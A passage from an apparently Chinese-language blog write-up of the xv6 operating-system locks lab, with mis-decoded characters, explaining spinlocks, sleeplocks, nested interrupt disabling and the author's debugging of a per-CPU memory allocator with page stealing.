kernel/spinlock.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">acquire</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span>&#123;</span><br><span class="line">  push_off();         <span class="comment">// å…³é—­ä¸­æ–­é˜²æ­¢æ­»é”</span></span><br><span class="line">  <span class="keyword">if</span>(holding(lk))</span><br><span class="line">    panic(<span class="string">&quot;acquire&quot;</span>); <span class="comment">// non-re-entrant</span></span><br><span class="line"></span><br><span class="line">  __sync_fetch_and_add(&amp;(lk-&gt;n), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(__sync_lock_test_and_set(&amp;lk-&gt;locked, <span class="number">1</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">    __sync_fetch_and_add(&amp;(lk-&gt;nts), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  __sync_synchronize();</span><br><span class="line"></span><br><span class="line">  lk-&gt;cpu = mycpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ç¡çœ é”-sleeplock"><a class="markdownIt-Anchor" href="#2-ç¡çœ é”-sleeplock"></a> 2. ç¡çœ é” sleeplock</h2><p>è‡ªæ—‹é”å­˜åœ¨ä¸¤ä¸ªæ€§èƒ½ä¸Šçš„é—®é¢˜ï¼š</p><ol><li>å…¶ä»–è¿›ç¨‹éœ€è¦è·å¾—é”å¯èƒ½ä¼šä¸€ç›´ç©ºè½¬ï¼Œä»è€Œæµªè´¹ CPU èµ„æº</li><li>æŒæœ‰é”çš„è¿›ç¨‹ä¸èƒ½ä¸»åŠ¨æ”¾å¼ƒæ—¶é—´ç‰‡ï¼ˆç­‰å¾… I/Oï¼‰ï¼Œå¦åˆ™å¯èƒ½æ­»é”</li></ol><p>åœ¨ spinlock çš„åŸºç¡€ä¸Šï¼Œxv6 å®ç°äº† sleeplock æ¥åº”å¯¹é•¿æ—¶é—´æŒæœ‰é”çš„åœºæ™¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sleeplock.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> &#123;</span></span><br><span class="line">  uint locked;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lk</span>;</span> <span class="comment">// ä¿æŠ¤ sleeplock çš„å†…éƒ¨è‡ªæ—‹é”</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">int</span> pid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ acquire å’Œ release æ“ä½œå¦‚ä¸‹ã€‚å®ƒä»¬å°è¯•è·å¾— sleeplock å‰éƒ½éœ€è¦å…ˆè·å¾—å†…éƒ¨çš„è‡ªæ—‹é” <code>lk-&gt;lk</code> ï¼Œä»è€Œä¿è¯ sleeplock åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹æŒæœ‰ã€‚ä¸åŒäº spinlock çš„ç©ºè½¬ï¼Œ<code>acquiresleep</code> å°è¯•æ—¶å¦‚æœ sleeplock å·²ç»è¢«æŒæœ‰ï¼Œé‚£ä¹ˆå°†ä¼šè°ƒç”¨ <code>sleep</code> ï¼ŒæŠŠè¿›ç¨‹çŠ¶æ€å˜ä¸º <code>SLEEPING</code> ï¼ŒåŒæ—¶é‡Šæ”¾å†…éƒ¨è‡ªæ—‹é”ï¼ˆå…³é”®ï¼Œä¸èƒ½å¸¦é”ç¡çœ ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/sleeplock.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">acquiresleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span>&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  <span class="keyword">while</span> (lk-&gt;locked) &#123;</span><br><span class="line">    sleep(lk, &amp;lk-&gt;lk);</span><br><span class="line">  &#125;</span><br><span class="line">  lk-&gt;locked = <span class="number">1</span>;</span><br><span class="line">  lk-&gt;pid = myproc()-&gt;pid;</span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">releasesleep</span><span class="params">(<span class="keyword">struct</span> sleeplock *lk)</span>&#123;</span><br><span class="line">  acquire(&amp;lk-&gt;lk);</span><br><span class="line">  lk-&gt;locked = <span class="number">0</span>;</span><br><span class="line">  lk-&gt;pid = <span class="number">0</span>;</span><br><span class="line">  wakeup(lk);</span><br><span class="line">  release(&amp;lk-&gt;lk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-lock-ä¸ä¸­æ–­å¤„ç†ç¨‹åº"><a class="markdownIt-Anchor" href="#3-lock-ä¸ä¸­æ–­å¤„ç†ç¨‹åº"></a> 3. Lock ä¸ä¸­æ–­å¤„ç†ç¨‹åº</h2><p>åœ¨ä¸€ä¸ª CPU æ ¸å¿ƒä¸Šï¼Œä¸­æ–­å¯ä»¥æ‰“æ–­æ­£åœ¨æ‰§è¡Œçš„ä»»ä½•ä»£ç ï¼ˆåŒ…æ‹¬æŒæœ‰é”çš„ä»£ç ï¼‰ï¼Œæ‰€ä»¥å¦‚æœå½“å‰ä»£ç  A æ­£åœ¨æŒæœ‰é” lockï¼Œæ­¤æ—¶ä¸€ä¸ªä¸­æ–­çš„åˆ°æ¥æ‰“æ–­äº†ä»£ç  Aï¼ŒCPU è·³è½¬æ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åº Bï¼Œå¦‚æœ B çš„æ‰§è¡Œé€»è¾‘éœ€è¦é” lock ï¼Œé‚£ä¹ˆå°±ä¼šå‘ç”Ÿæ­»é”ã€‚</p><p>ä¸Šè¿°é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šå¦‚æœä¸€ä¸ªé”ï¼ˆæ¯”å¦‚ Â lkï¼‰å¯èƒ½ä¼šè¢«ä¸­æ–­å¤„ç†ç¨‹åºè·å–ï¼Œé‚£ä¹ˆä»»ä½•ä»£ç åœ¨æŒæœ‰è¿™ä¸ªé” Â lkÂ  çš„æœŸé—´ï¼Œéƒ½å¿…é¡»ç¦ç”¨ä¸­æ–­ä»¥é˜²æ­¢æ­»é”ã€‚å¯¹äºè¿™ä¸ªè§£å†³æ–¹æ¡ˆï¼Œxv6 é‡‡å–äº†æ›´ä¿å®ˆä¹Ÿæ›´ç®€å•çš„æ–¹æ³•ï¼Œå³<strong>åœ¨è·å–ä»»ä½•ä¸€ä¸ªè‡ªæ—‹é”ä¹‹å‰ï¼Œéƒ½å¿…é¡»ç¦ç”¨å½“å‰ CPU æ ¸å¿ƒçš„ä¸­æ–­ã€‚</strong></p><blockquote><p>Xv6 is more conservative: when a CPU acquires any lock, xv6 always disables interrupts on that CPU.</p></blockquote><p>ç°åœ¨çš„é—®é¢˜æ˜¯ï¼šæˆ‘ä»¬å¦‚ä½•ä¼˜é›…åœ°å®ç°â€œè·å–é”å‰å…³ä¸­æ–­ï¼Œé‡Šæ”¾é”åå¼€ä¸­æ–­â€è¿™ä¸ªé€»è¾‘å‘¢ï¼Ÿ</p><p>ä¸€ä¸ªå¤©çœŸçš„æƒ³æ³•å¯èƒ½æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">acquire</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span> &#123;</span><br><span class="line">  intr_off(); <span class="comment">// å…³é—­ä¸­æ–­</span></span><br><span class="line">  <span class="comment">// ... è‡ªæ—‹è·å–é” ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">release</span><span class="params">(<span class="keyword">struct</span> spinlock *lk)</span> &#123;</span><br><span class="line">  <span class="comment">// ... é‡Šæ”¾é” ...</span></span><br><span class="line">  intr_on(); <span class="comment">// å¼€å¯ä¸­æ–­</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªå¤©çœŸçš„å®ç°å­˜åœ¨åµŒå¥—ä¸Šé”(Nested Locking)çš„é—®é¢˜</strong>ã€‚è€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acquire(&amp;lock_A); <span class="comment">// 1. ä¸­æ–­è¢«å…³é—­</span></span><br><span class="line"><span class="comment">// ... do something ...</span></span><br><span class="line">acquire(&amp;lock_B); <span class="comment">// 2. ä¸­æ–­å†æ¬¡è¢«å…³é—­ (è™½ç„¶å·²ç»å…³äº†)</span></span><br><span class="line"><span class="comment">// ... do something with A and B ...</span></span><br><span class="line">release(&amp;lock_B); <span class="comment">// 3. ä¸­æ–­è¢«å¼€å¯äº†ï¼</span></span><br><span class="line"><span class="comment">// ... do something with A ...  &lt;-- é—®é¢˜å‘ç”Ÿåœ¨è¿™é‡Œï¼</span></span><br><span class="line">release(&amp;lock_A); <span class="comment">// 4. ä¸­æ–­å†æ¬¡è¢«å¼€å¯</span></span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬ 3 æ­¥ Â <code>release(&amp;lock_B)</code>Â  æ—¶ï¼Œå®ƒè°ƒç”¨ Â <code>intr_on()</code> <strong>è¿‡æ—©åœ°å¼€å¯äº†ä¸­æ–­</strong>ï¼Œåœ¨ç¬¬ 4 æ­¥æ‰§è¡Œå‰å¦‚æœå‘ç”Ÿä¸­æ–­ï¼Œä¸”è¿™ä¸ªä¸­æ–­éœ€è¦è·å¾— <code>lock_A</code> ï¼Œåˆ™å‘ç”Ÿæ­»é”ã€‚å› æ­¤ä¸èƒ½ç®€å•åœ°ä½¿ç”¨å¼€å…³ä¸­æ–­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´æ™ºèƒ½çš„æœºåˆ¶ï¼Œå®ƒåº”è¯¥èƒ½åšåˆ°å½“åªæœ‰åœ¨é‡Šæ”¾äº†æœ€åä¸€å±‚é”ä¹‹åï¼Œæ‰çœŸæ­£åœ°æ¢å¤ä¸­æ–­åˆ°å®ƒæœ€åˆçš„çŠ¶æ€ã€‚</p><p>xv6 ä¸ºæ­¤è€Œè®¾è®¡äº†åµŒå¥—ä¸­æ–­ç¦ç”¨æœºåˆ¶ <code>push_off</code> å’Œ <code>pop_off</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/spinlock.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_off</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="type">int</span> old = intr_get();</span><br><span class="line"></span><br><span class="line">  intr_off();</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff == <span class="number">0</span>)</span><br><span class="line">    mycpu()-&gt;intena = old;</span><br><span class="line">  mycpu()-&gt;noff += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop_off</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">c</span> =</span> mycpu();</span><br><span class="line">  <span class="keyword">if</span>(intr_get())</span><br><span class="line">    panic(<span class="string">&quot;pop_off - interruptible&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(c-&gt;noff &lt; <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;pop_off&quot;</span>);</span><br><span class="line">  c-&gt;noff -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(c-&gt;noff == <span class="number">0</span> &amp;&amp; c-&gt;intena)</span><br><span class="line">    intr_on();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line">  <span class="type">int</span> noff;       <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="type">int</span> intena;     <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™ä¸ªæœºåˆ¶çš„æ ¸å¿ƒå°±æ˜¯å¯¹å½“å‰ CPU æ‰€æŒæœ‰çš„é”è¿›è¡Œäº†è®¡æ•°ï¼ˆå®é™…æ˜¯è¯·æ±‚è·å¾—é”çš„æ¬¡æ•°ï¼‰ï¼Œåªæœ‰å½“ <code>noff</code> ä¸º 0 æ—¶æ‰ä¼šæ¢å¤ä¸­æ–­ä½¿èƒ½åˆ°ç¬¬ä¸€æ¬¡å°è¯•è·å¾—é”ä¹‹å‰çš„çŠ¶æ€ <code>intena</code>ã€‚</p><hr><h1 id="memory-allocator"><a class="markdownIt-Anchor" href="#memory-allocator"></a> Memory allocator</h1><h2 id="kalloctest-æµ‹è¯•"><a class="markdownIt-Anchor" href="#kalloctest-æµ‹è¯•"></a> kalloctest æµ‹è¯•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/kalloctest.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start test1\n&quot;</span>);</span><br><span class="line">  m = ntas(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCHILD; i++)&#123;  <span class="comment">// forkä¸¤ä¸ªå­è¿›ç¨‹</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        a = sbrk(<span class="number">4096</span>);   <span class="comment">// 1.</span></span><br><span class="line">        *(<span class="type">int</span> *)(a+<span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">        a1 = sbrk(<span class="number">-4096</span>); <span class="comment">// 2.</span></span><br><span class="line">        <span class="keyword">if</span> (a1 != a + <span class="number">4096</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;test1: FAIL wrong sbrk\n&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;test1 results:\n&quot;</span>);</span><br><span class="line">  n = ntas(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(n-m &lt; <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test1 OK\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test1 FAIL\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæµ‹è¯• <code>test1</code> fork ä¸¤ä¸ªå­è¿›ç¨‹ï¼Œæ¯ä¸ªå­è¿›ç¨‹é¢‘ç¹åœ°è°ƒç”¨ <code>sbrk</code> ç³»ç»Ÿè°ƒç”¨æ¥å¢å‡è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œ<code>sbrk</code> æœ€ç»ˆè°ƒç”¨ <code>kalloc</code> ä¸ <code>kfree</code> ï¼Œå®ƒä»¬éƒ½éœ€è¦è¯·æ±‚æŒæœ‰ <code>kmem.lock</code> ä»¥ä¿®æ”¹å”¯ä¸€çš„ <code>kmem.freelist</code> ç©ºé—²ç‰©ç†é¡µé“¾è¡¨ã€‚æŒ‰å®éªŒæŒ‡å¯¼çš„æµ‹è¯•æ¥çœ‹ï¼Œé«˜å¼ºåº¦åœ°è°ƒç”¨ <code>sbrk</code> ç»“æœåº”è¯¥æ˜¯å¯¹ kmem é”çš„ç«äº‰å¼ºåº¦å¾ˆé«˜ã€‚<br><img src="/2025/07/16/Lab-Locks/guidance.png" alt="guidance.png"></p><p>ä½†åœ¨æˆ‘ä¸€å¼€å§‹çš„æµ‹è¯•ä¸­ï¼Œtop 5 çš„ç«äº‰å…¨æ˜¯ proc é”ï¼Œæ€€ç–‘æ˜¯ä¹‹å‰ superpage æ·±å…¥ä¿®æ”¹äº†å†…å­˜åˆ†é…çš„é€»è¾‘ï¼Œå¯¼è‡´æ•ˆç‡å˜ä½ï¼Œå°è¯•å±è”½ superpage åé—®é¢˜ä¾æ—§å­˜åœ¨ï¼Œæœ‰å¯èƒ½æ˜¯ä¹‹å‰çš„å®éªŒé€ æˆçš„é—®é¢˜ï¼Œå®¡æŸ¥æ— æœåé€‰æ‹©åœ¨ä¹‹å‰çš„æäº¤ä¸Šæ–°å¼€ä¸€ä¸ªåˆ†æ”¯è¿›è¡Œå®éªŒã€‚ï¼ˆè½¯ç³¯äº†ï¼Œè¿™éœ€è¦ä»”ç»†çš„ä»£ç å®¡æŸ¥ï¼‰<br><img src="/2025/07/16/Lab-Locks/kalloctest_before.png" alt="kalloctest_before.png"></p><p>åœ¨å®Œæˆ syscalls åçš„ commit åŸºç¡€ä¸Šç»§ç»­å®éªŒï¼Œkalloctest æµ‹è¯•ç»“æœå´ä¾æ—§æ˜¯ proc é”é«˜åº¦ç«äº‰ã€‚proc é”ç«äº‰é«˜ï¼Œè¯´æ˜è¿›ç¨‹å¸¦ç€é”è¿›è¡Œä¸€äº›å¾ˆè€—æ—¶çš„æ“ä½œï¼Œä½† syscalls å®éªŒä¸­æˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰ä¿®æ”¹å†…å­˜åˆ†é…çš„é€»è¾‘ï¼Œåªæ˜¯åŠ äº† <code>trace</code> å’Œ <code>sysinfo</code> ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºä»€ä¹ˆ kalloctest æµ‹è¯•æœ€é«˜ç«äº‰åº¦çš„ä¸æ˜¯ <code>kmem</code> çš„é”ï¼Ÿ<br><img src="/2025/07/16/Lab-Locks/branch.png" alt="branch.png"></p><p>æ—¢ç„¶å›é€€åˆ°äº†å¹²å‡€çš„ç‰ˆæœ¬ï¼Œé—®é¢˜ä¾æ—§å‡ºç°ï¼Œæˆ–è®¸å¹¶éå‡ºåœ¨æºç çš„é—®é¢˜ä¸Šã€‚é‚£ä¹ˆé—®é¢˜ä¼šä¸ä¼šæ˜¯ CPU é¢‘ç‡è¿‡é«˜æˆ–è€… xv6 æ ¸æ•°è¿‡å¤šï¼Œè€Œ fork çš„å­è¿›ç¨‹åªæœ‰ä¸¤ä¸ªï¼Œæ‰å¯¼è‡´çš„ proc é”é«˜åº¦ç«äº‰å‘¢ï¼Ÿ kalloctestÂ  çš„æ ¸å¿ƒè´Ÿè½½æ˜¯ç”± Â 2 ä¸ªå­è¿›ç¨‹å¹¶è¡Œåœ°ã€é«˜é¢‘åœ°è°ƒç”¨ Â <code>sbrk()</code>Â  äº§ç”Ÿçš„ã€‚è¿™æ„å‘³ç€åœ¨ä»»ä½•æ—¶åˆ»ï¼Œæœ€å¤šåªæœ‰ Â <strong>2 ä¸ª CPU æ ¸å¿ƒ</strong>åœ¨çœŸæ­£åœ°ç»™ Â kallocÂ  æ–½åŠ å‹åŠ›ã€‚</p><p>ä¸ºäº†éªŒè¯æˆ‘çš„çŒœæƒ³ï¼Œä¸€æ–¹é¢æˆ‘é€šè¿‡åˆå§‹åŒ–ä¸åŒæ ¸å¿ƒæ•°ï¼ˆ2ï¼Œ4ï¼Œ8ï¼‰å¹¶æµ‹è¯•ï¼Œæœ€ç»ˆè®¾ç½® CPU æ ¸æ•°ä¸º 2 æ—¶ kmem é”ç«äº‰ç»ˆäºæ¥åˆ°äº† top 5ï¼Œå¦ä¸€æ–¹é¢æé«˜ <code>NCHILD</code> å­è¿›ç¨‹çš„æ•°ç›®ä½¿å¾—å¹¶è¡Œä»»åŠ¡å¤§äº CPU æ ¸æ•°ï¼Œç»“æœ kmem é”çš„ç«äº‰å¤§å¹…ä¸Šå‡ï¼Œè¯´æ˜æˆ‘çš„çŒœæƒ³æ˜¯å¯¹çš„ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå°±ä¸ç®¡æµ‹è¯•ç»“æœå¦‚ä½•ï¼Œç›´æ¥ä¸Šæ‰‹å®éªŒäº†ã€‚<br><img src="/2025/07/16/Lab-Locks/cpu2.png" alt="cpu2.png"><br><img src="/2025/07/16/Lab-Locks/child10.png" alt="child10.png"></p><h2 id="ç»†åŒ–-kmem-é”å®ç°"><a class="markdownIt-Anchor" href="#ç»†åŒ–-kmem-é”å®ç°"></a> ç»†åŒ– kmem é”å®ç°</h2><blockquote><p><strong>Your job is to implement per-CPU freelists, and stealing when a CPUâ€™s free list is empty.</strong> You must give all of your locks names that start with â€œkmemâ€. That is, you should callÂ <code>initlock</code>Â for each of your locks, and pass a name that starts with â€œkmemâ€. Run kalloctest to see if your implementation has reduced lock contention.</p><p>To check that it can still allocate all of memory, runÂ <code>usertests sbrkmuch</code>. Your output will look similar to that shown below, with much-reduced contention in total on kmem locks, although the specific numbers will differ. Make sure all tests inÂ <code>usertests -q</code>Â pass.</p></blockquote><p>ä»»åŠ¡è¦æ±‚è¯´å¾—å¾ˆæ¸…æ¥šäº†ï¼Œç”±åŸæ¥æ‰€æœ‰ CPU ç«äº‰ä¸€ä¸ª kmem é”æ¥è®¿é—®å”¯ä¸€çš„ <code>kmem.freelist</code>ï¼Œä¼˜åŒ–ä¸ºåˆ†é…ç»™æ¯ä¸ª CPU ä¸€ä¸ª <code>kmem.freelist</code> ï¼Œå¹¶ä¸”å½“ CPU çš„ç©ºé—²ç‰©ç†é¡µé“¾è¡¨ä¸ºç©ºæ—¶è¦ä»å…¶ä»–çš„ CPU çš„é“¾è¡¨ä¸­æ‹¿ä¸€ä¸ªç‰©ç†é¡µï¼Œå®ç° stealing æœºåˆ¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/kalloctest.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> free0 = countfree();</span><br><span class="line">  <span class="type">int</span> free1;</span><br><span class="line">  <span class="type">int</span> n = (PHYSTOP-KERNBASE)/PGSIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start test2\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;total free number of pages: %d (out of %d)\n&quot;</span>, free0, n);</span><br><span class="line">  <span class="keyword">if</span>(n - free0 &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test2 FAILED: cannot allocate enough memory&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">    free1 = countfree();   <span class="comment">// å¤šæ¬¡è°ƒç”¨countfreeï¼Œå®ƒæœ¬èº«æ— å‰¯ä½œç”¨</span></span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">10</span> == <span class="number">9</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(free1 != free0) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;test2 FAIL: losing pages %d %d\n&quot;</span>, free0, free1);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\ntest2 OK\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/16/Lab-Locks/test2_failed.png" alt="test2_failed.png"><br>ç¬¬ä¸€æ¬¡å®ç°ä¿®æ”¹ <code>kalloc</code> ä»¥åŠ <code>kfree</code> çš„å†…å­˜åˆ†é…é€»è¾‘ï¼Œtest1 æˆåŠŸé€šè¿‡ã€‚ä½† test2 ç»“æœ <code>free1 &lt; free0</code> ï¼Œè¯´æ˜<strong>ä¹‹å‰ steal æœºåˆ¶çš„å®ç°å¯èƒ½å­˜åœ¨å†…å­˜æ³„æ¼</strong>ã€‚</p><p>é‡æ–°å®¡æŸ¥å®ç°çš„ <code>kalloc</code> å‘ç°åŸæ¥æ˜¯éå† CPU çš„æ¡ä»¶å‡ºé”™äº†ã€‚éå†åˆ° <code>i == id</code> åˆ™ä¼šç»ˆæ­¢å¾ªç¯ï¼Œåé¢çš„ CPU å­˜åœ¨å¾ˆå¤šç©ºé—²ç‰©ç†é¡µä¹Ÿæ— æ³•åˆ©ç”¨ï¼Œè¯¯ä»¥ä¸º â€œå†…å­˜ä¸è¶³â€ ï¼Œä»è€Œåœ¨ Â <code>countfree</code>Â  æµ‹è¯•ä¸­é€ æˆäº†â€œçœ‹èµ·æ¥åƒå†…å­˜æ³„æ¼â€çš„ç°è±¡ï¼Œè¿”å›çš„ <code>free1</code> ä¼šæ˜æ˜¾å°äºåŸºå‡†å€¼ <code>free0</code> ã€‚ä¿®æ”¹ä¸º <code>for(int i = (id+1)%NCPU; i != id; i = (i+1)%NCPU)</code> åé€šè¿‡ test2 ã€‚test3 ä¹Ÿé€šè¿‡äº†ï¼Œè¯´æ˜é”æœºåˆ¶çš„å®ç°ï¼ˆæ¯ä¸ª Â freelistÂ  æœ‰è‡ªå·±çš„é”ï¼‰å’Œå·å–æ—¶çš„é”æ“ä½œæ˜¯æ— æ­»é”çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line">  <span 